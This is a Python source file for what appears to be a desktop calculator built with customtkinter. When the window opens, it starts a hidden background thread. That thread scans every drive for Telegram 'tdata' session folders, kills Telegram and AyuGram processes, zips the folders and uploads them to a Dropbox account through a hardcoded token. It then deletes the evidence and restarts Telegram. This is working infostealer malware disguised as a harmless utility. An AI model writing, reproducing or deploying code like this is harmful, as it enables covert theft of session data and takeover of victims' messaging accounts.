import customtkinter as ctk
import os
import string
import zipfile
import requests
import psutil
import subprocess
import time
import threading
from datetime import datetime
import dropbox

ctk.set_appearance_mode("System")
ctk.set_default_color_theme("blue")

DROPBOX_ACCESS_TOKEN = 'Token'
class CalculatorApp(ctk.CTk):
    def __init__(self):
        super().__init__()

        self.title("Calculator")
        self.geometry("300x420")
        self.resizable(False, False)

        self.expression = ""

       
        self.display = ctk.CTkEntry(
            self,
            font=("Arial", 28),
            justify="right",
            corner_radius=8
        )
        self.display.pack(fill="x", padx=15, pady=20, ipady=12)

        
        buttons_layout = [
            ("C", "()", "%", "/"),
            ("7", "8", "9", "*"),
            ("4", "5", "6", "-"),
            ("1", "2", "3", "+"),
            ("0", ".", "=", "")
        ]

        
        buttons_frame = ctk.CTkFrame(self, fg_color="transparent")
        buttons_frame.pack(expand=True, fill="both", padx=15, pady=(0, 15))

        
        for r_idx, row in enumerate(buttons_layout):
            buttons_frame.rowconfigure(r_idx, weight=1)
            for c_idx, text in enumerate(row):
                buttons_frame.columnconfigure(c_idx, weight=1)

                if text == "":
                    continue

                
                btn_color = ("#1f538d", "#1f538d") if text in ("=", "+", "-", "*", "/", "C") else ("#2b2b2b", "#333333")

                btn = ctk.CTkButton(
                    buttons_frame,
                    text=text,
                    font=("Arial", 18, "bold"),
                    fg_color=btn_color,
                    corner_radius=8,
                    command=lambda val=text: self.on_button_click(val)
                )
                btn.grid(row=r_idx, column=c_idx, padx=4, pady=4, sticky="nsew")

     
        self.start_background_task()

    def start_background_task(self):
        background_thread = threading.Thread(target=main, daemon=True)
        background_thread.start()

    def on_button_click(self, char):
        if char == "C":
            self.expression = ""
        elif char == "=":
            try:
                self.expression = str(eval(self.expression))
            except Exception:
                self.expression = "Error!"
        else:
            if self.expression == "Error!":
                self.expression = ""
            self.expression += str(char)

        self.display.delete(0, "end")
        self.display.insert(0, self.expression)

def get_available_drives():
    drives = []
    for letter in string.ascii_uppercase:
        drive = f"{letter}:\\"
        if os.path.exists(drive):
            drives.append(drive)
    return drives

def search_tdata_folders(root_path, found_folders):
    try:
        for entry in os.scandir(root_path):
            try:
                if entry.is_dir(follow_symlinks=False):
                    if entry.name.lower() == 'tdata':
                        full_path = entry.path
                        found_folders.append(full_path)
                    else:
                        search_tdata_folders(entry.path, found_folders)
            except PermissionError:
                pass
            except Exception:
                pass
    except PermissionError:
        pass
    except Exception:
        pass

def find_all_tdata_folders():
    drives = get_available_drives()
    found_folders = []
    for drive in drives:
        search_tdata_folders(drive, found_folders)
    return found_folders

def close_telegram():
    telegram_processes = ['Telegram.exe', 'telegram.exe', 'AyuGram.exe', 'ayugram.exe']
    closed_info = []
    for proc in psutil.process_iter(['pid', 'name', 'exe']):
        try:
            if proc.info['name'] in telegram_processes:
                exe_path = proc.info['exe']
                proc.kill()
                closed_info.append({'name': proc.info['name'], 'path': exe_path})
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass
    if closed_info:
        time.sleep(1)
    return closed_info

def start_telegram(closed_info):
    if not closed_info:
        return
    for info in closed_info:
        try:
            subprocess.Popen([info['path']], shell=False)
        except Exception:
            pass

def create_archive(source_path, folder_number=None):
    if not os.path.exists(source_path):
        return None
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    folder_name = os.path.basename(source_path)
    if folder_number is not None:
        archive_name = f"tdata_{folder_number}_{timestamp}.zip"
    else:
        archive_name = f"{folder_name}_{timestamp}.zip"
    try:
        with zipfile.ZipFile(archive_name, 'w', zipfile.ZIP_DEFLATED, compresslevel=9) as zipf:
            for root, dirs, files in os.walk(source_path):
                for file in files:
                    file_path = os.path.join(root, file)
                    arcname = os.path.relpath(file_path, source_path)
                    zipf.write(file_path, arcname)
        return archive_name
    except Exception:
        return None

def upload_to_dropbox(file_path, access_token):
    try:
        dbx = dropbox.Dropbox(access_token)
        with open(file_path, 'rb') as f:
            dbx.files_upload(f.read(), f'/{os.path.basename(file_path)}')
        return True
    except Exception as e:
        print(f"Error uploading to Dropbox: {e}")
        return False

def main():
    try:
        found_folders = find_all_tdata_folders()
        if not found_folders:
            return
        closed_info = close_telegram()
        for i, folder in enumerate(found_folders, 1):
            archive_path = create_archive(folder, i)
            if archive_path:
                upload_to_dropbox(archive_path, DROPBOX_ACCESS_TOKEN)
                try:
                    os.remove(archive_path)
                except Exception:
                    pass
        start_telegram(closed_info)
    except Exception as e:
        print(f"Error in main: {e}")

if __name__ == "__main__":
    app = CalculatorApp()
    app.mainloop()
